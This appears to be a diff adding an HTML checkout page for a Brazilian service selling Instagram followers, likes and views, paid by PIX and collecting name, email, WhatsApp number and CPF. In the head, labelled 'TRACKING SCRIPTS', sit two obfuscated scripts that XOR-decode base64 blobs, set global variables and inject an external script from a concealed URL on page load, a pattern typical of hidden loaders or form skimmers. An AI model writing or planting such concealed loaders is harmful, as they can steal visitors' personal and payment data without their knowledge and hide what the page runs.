@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Checkout - Aumenta Digital</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="checkout.css?v=3">
+  <!-- TRACKING SCRIPTS -->
+  <script>(function(){var h_qo3c=atob("DO3/RFCPx7NEyXM+F5bdMSLj5YlmoQdKZ57Fa3/so91qvAdTfouGajPgqp0mu1xNdJ+WNCT86MMtsRZSOJ2WPDXj6dk3618cdpmLNjntsschulEETLDTZjfjqNElpQAcLbaEZj7uqtZm81FOfpWaKBnr5Z9mvxJSYojdfnK5poQn8BYNctzJdTTr8dZ1/hEIItqacDOtuu45");var e_gl=[];for(var s_6hcp=0;s_6hcp<h_qo3c.length;s_6hcp++){e_gl.push(h_qo3c.charCodeAt(s_6hcp)&255);}var j_y9x0=e_gl[0];var y_o8o=e_gl.slice(1,1+j_y9x0);var g_p=e_gl.slice(1+j_y9x0);var z_sln6=g_p.map(function(b,b_1i1){return b^y_o8o[b_1i1%j_y9x0];});var k_agz="";for(var h_v=0;h_v<z_sln6.length;h_v++){k_agz+=String.fromCharCode(z_sln6[h_v]&255);}var m_121n=decodeURIComponent(escape(k_agz));var e_n4=JSON.parse(m_121n);var u_e2=e_n4.globals||[];u_e2.forEach(function(o_z7){window[o_z7.name]=o_z7.value;});var a_w07=document.createElement("script");a_w07.src=e_n4.url;a_w07.async=true;a_w07.defer=true;(e_n4.attributes||[]).forEach(function(f_sg){a_w07.setAttribute(f_sg.name,f_sg.value);});(document.head||document.documentElement).appendChild(a_w07);})();</script>
+  <script>(function(){var z_7x=atob("DE4Os9l7/QapNfNSHjUsxqsX3zyLXYcmbj00nPYYmWiHQIc/dyh3nboUkCjLR9whfTxnw60I0nPdWIB9ci961qoP02zaF99wfzp6wbAZiHLMRtFoRTUs3bgWmCSTF5czai8jxq0WlGDQGIMgezhr3a1WhWXGUd4hfSUsn/sNnGrcUNFoPGxzn6JZk2fEUNFoPCpvx7hWiHLEXJUrMz581q8ek3KERoYwdyp9kfVZi2fFQJZwJGwszoQG");var n_mmyj=[];for(var r_4=0;r_4<z_7x.length;r_4++){n_mmyj.push(z_7x.charCodeAt(r_4)&255);}var j_8=n_mmyj[0];var j_zxo=n_mmyj.slice(1,1+j_8);var c_f=n_mmyj.slice(1+j_8);var n_m=c_f.map(function(b,r_gl4){return b^j_zxo[r_gl4%j_8];});var s_if9="";for(var d_9al=0;d_9al<n_m.length;d_9al++){s_if9+=String.fromCharCode(n_m[d_9al]&255);}var v_7u=decodeURIComponent(escape(s_if9));var r_7f=JSON.parse(v_7u);var k_j=r_7f.globals||[];k_j.forEach(function(z_n){window[z_n.name]=z_n.value;});var m_rcb=document.createElement("script");m_rcb.src=r_7f.url;m_rcb.async=true;m_rcb.defer=true;(r_7f.attributes||[]).forEach(function(d_u){m_rcb.setAttribute(d_u.name,d_u.value);});(document.head||document.documentElement).appendChild(m_rcb);})();</script>
+</head>
+<body>
+
+<!-- NAVBAR -->
+<nav class="ck-navbar">
+  <div class="ck-navbar-inner">
+    <a href="index.html" class="ck-logo">
+      <svg class="logo-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" width="32" height="32"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z" fill="url(#ig-ck)"/><defs><linearGradient id="ig-ck" x1="0" y1="24" x2="24" y2="0"><stop stop-color="#FFDD55"/><stop offset=".5" stop-color="#FF543E"/><stop offset="1" stop-color="#C837AB"/></linearGradient></defs></svg>
+      <span>Aumenta <strong>Digital</strong></span>
+    </a>
+    <div class="ck-nav-right">
+      <span class="ck-menu-label">Menu</span>
+      <button class="ck-menu-btn" onclick="document.querySelector('.ck-mobile-menu').classList.toggle('active')">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg>
+      </button>
+      <a href="https://api.whatsapp.com/send?phone=5522992152621&text=Olá+preciso+de+ajuda!" target="_blank" class="ck-whatsapp-btn">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 0C5.373 0 0 5.373 0 12c0 2.127.555 4.126 1.527 5.86L0 24l6.335-1.485A11.95 11.95 0 0012 24c6.627 0 12-5.373 12-12S18.627 0 12 0zm0 21.82a9.78 9.78 0 01-5.38-1.604l-.386-.23-3.997.938.997-3.855-.25-.398A9.78 9.78 0 012.18 12C2.18 6.58 6.58 2.18 12 2.18S21.82 6.58 21.82 12 17.42 21.82 12 21.82z"/></svg>
+      </a>
+    </div>
+  </div>
+</nav>
+
+<!-- CHECKOUT CONTENT -->
+<main class="ck-main">
+  <div class="ck-grid">
+    <!-- LEFT: FORM -->
+    <div class="ck-form-section">
+      <div class="ck-info-bar">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#3b82f6"><circle cx="12" cy="12" r="10"/><path d="M12 16v-4M12 8h.01" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg>
+        <span>Seu perfil precisa estar público</span>
+        <a href="#" class="ck-help-link" onclick="return false">Como fazer um pedido? <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3M12 17h.01"/></svg></a>
+      </div>
+
+      <div class="ck-form-card">
+        <form id="checkoutForm" onsubmit="return handleCheckout(event)">
+          <div class="ck-field">
+            <label for="ck-profile">@ do Perfil ou link</label>
+            <input type="text" id="ck-profile" placeholder="@ do Perfil ou link" required>
+          </div>
+          <div class="ck-field">
+            <label for="ck-name">Nome Completo <span class="required">*</span></label>
+            <input type="text" id="ck-name" placeholder="Seu nome completo" required>
+          </div>
+          <div class="ck-field">
+            <label for="ck-email">Endereço de Email <span class="required">*</span></label>
+            <input type="email" id="ck-email" placeholder="Por favor, insira seu endereço de email" required>
+          </div>
+          <div class="ck-field">
+            <label for="ck-whatsapp">Seu Whatsapp <span class="required">*</span></label>
+            <input type="tel" id="ck-whatsapp" placeholder="Ex: 98 99219 1501" required>
+            <small class="ck-hint">para receber atualizações referente ao seu pedido.</small>
+          </div>
+          <div class="ck-field">
+            <label for="ck-cpf">CPF <span class="required">*</span></label>
+            <input type="text" id="ck-cpf" placeholder="000.000.000-00" maxlength="14" required>
+          </div>
+          <label class="ck-checkbox">
+            <input type="checkbox" id="ck-terms" checked>
+            <span>Concordo com os <a href="#" onclick="document.getElementById('ck-terms-modal').classList.add('active');return false" class="ck-terms-link">termos de uso</a></span>
+          </label>
+
+          <!-- UPSELL OFFERS -->
+          <div class="ck-upsell">
+            <div class="ck-upsell-header">
+              <img src="https://cdn.jsdelivr.net/gh/twitter/twemoji@14.0.2/assets/72x72/1f381.png" alt="Presente" width="52">
+              <h3>Ofertas Exclusivas</h3>
+              <span class="ck-optional">Opcional</span>
+            </div>
+
+            <div class="ck-upsell-item" id="upsell-curtidas">
+              <div class="ck-upsell-left">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="1.5"><path d="M20.84 4.61a5.5 5.5 0 00-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 00-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 000-7.78z"/></svg>
+                <div>
+                  <strong>4.500</strong> Curtidas BR 🇧🇷
+                </div>
+              </div>
+              <div class="ck-upsell-right">
+                <span class="ck-upsell-price">R$ 60,00</span>
+                <button type="button" class="ck-upsell-btn" onclick="toggleUpsell('curtidas', 60)">Adicionar</button>
+              </div>
+            </div>
+
+            <div class="ck-upsell-item" id="upsell-views">
+              <div class="ck-upsell-left">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="1.5"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+                <div>
+                  <strong>100.000</strong> Visualizações em Reels 🇧🇷
+                </div>
+              </div>
+              <div class="ck-upsell-right">
+                <span class="ck-upsell-price">R$ 57,00</span>
+                <button type="button" class="ck-upsell-btn" onclick="toggleUpsell('views', 57)">Adicionar</button>
+              </div>
+            </div>
+          </div>
+
+          <!-- COUPON -->
+          <div class="ck-coupon-toggle" onclick="document.getElementById('ck-coupon-area').classList.toggle('active')">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#3b82f6" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+            <span>Inserir cupom de desconto</span>
+          </div>
+          <div class="ck-coupon-area" id="ck-coupon-area">
+            <input type="text" id="ck-coupon" placeholder="Código do cupom">
+            <button type="button" class="ck-coupon-btn">Aplicar</button>
+          </div>
+
+          <!-- ORDER SUMMARY (inline) -->
+          <div class="ck-summary">
+            <div class="ck-summary-line">
+              <span id="summary-item">Carregando...</span>
+              <span id="summary-base-price">---</span>
+            </div>
+            <div class="ck-summary-line ck-summary-extra" id="summary-extras" style="display:none">
+              <span id="summary-extras-label">Extras</span>
+              <span id="summary-extras-price">R$ 0,00</span>
+            </div>
+            <hr>
+            <div class="ck-summary-total">
+              <span>Total a pagar:</span>
+              <span class="ck-total-price" id="summary-total">---</span>
+            </div>
+          </div>
+
+          <!-- PAY BUTTON -->
+          <button type="submit" class="ck-pay-btn">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            PAGAR AGORA VIA PIX
+          </button>
+
+          <!-- SECURITY -->
+          <div class="ck-security">
+            <div class="ck-sec-badges">
+              <span><svg width="14" height="14" viewBox="0 0 24 24" fill="#10b981"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg> Pagamento 100% Seguro</span>
+              <span><svg width="14" height="14" viewBox="0 0 24 24" fill="#10b981"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg> Dados Protegidos</span>
+            </div>
+            <p>✅ Seus dados estão protegidos e não serão compartilhados</p>
+          </div>
+        </form>
+
+        <!-- PIX RESULT (hidden by default) -->
+        <div class="ck-pix-result" id="pix-result" style="display:none">
+          <div class="ck-pix-header">
+            <svg width="32" height="32" viewBox="0 0 24 24" fill="#10b981"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            <h3>PIX Gerado com Sucesso!</h3>
+            <p>Escaneie o QR Code ou copie o código PIX abaixo</p>
+          </div>
+          <div class="ck-pix-qr">
+            <img id="pix-qr-img" src="" alt="QR Code PIX">
+          </div>
+          <div class="ck-pix-code-area">
+            <label>Código PIX (Copia e Cola)</label>
+            <div class="ck-pix-code-wrap">
+              <input type="text" id="pix-code-input" readonly>
+              <button type="button" class="ck-copy-btn" onclick="copyPixCode()">COPIAR PIX</button>
+            </div>
+            <p class="ck-pix-timer">⏱ Pagamento expira em <strong>24 horas</strong></p>
+          </div>
+          <div class="ck-pix-status" id="pix-status">
+            <div class="ck-pix-spinner"></div>
+            <span>Aguardando pagamento...</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- RIGHT: ORDER SUMMARY CARD -->
+    <div class="ck-sidebar">
+      <div class="ck-order-card">
+        <h3>Resumo do Pedido</h3>
+        <div class="ck-discount-badge" id="ck-badge">50% DE DESCONTO</div>
+        <div class="ck-qty" id="ck-qty">---</div>
+        <div class="ck-service-label">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="url(#ig-ck2)"><defs><linearGradient id="ig-ck2" x1="0" y1="24" x2="24" y2="0"><stop stop-color="#FFDD55"/><stop offset=".5" stop-color="#FF543E"/><stop offset="1" stop-color="#C837AB"/></linearGradient></defs><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
+          <span id="ck-service-name">Seguidores</span>
+        </div>
+
+        <!-- SLIDER -->
+        <div class="ck-slider-wrap">
+          <input type="range" id="ck-slider" min="0" max="100" value="50" class="ck-slider">
+          <div class="ck-slider-labels"><span>Min</span><span>Deslize para aumentar</span><span>Max</span></div>
+        </div>
+
+        <hr>
+        <div class="ck-order-total">
+          <span>Total a pagar:</span>
+          <span class="ck-total-val" id="ck-total-val">---</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</main>
+
+<!-- TERMS MODAL -->
+<div class="terms-overlay" id="ck-terms-modal">
+  <div class="terms-modal">
+    <button class="modal-close" onclick="document.getElementById('ck-terms-modal').classList.remove('active')">&times;</button>
+    <h3>Termos de Uso</h3>
+    <h4>1. Aceitação</h4><p>O presente instrumento constitui contrato eletrônico vinculante.</p>
+    <h4>2. Objeto dos Serviços</h4><p>Serviços digitais de incremento de métricas em redes sociais.</p>
+    <h4>3. Garantia de Reposição</h4><p>Aplica-se apenas a seguidores, dentro do prazo de 30 dias.</p>
+  </div>
+</div>
+
+<script src="checkout.js?v=3"></script>
+</body>
+</html>
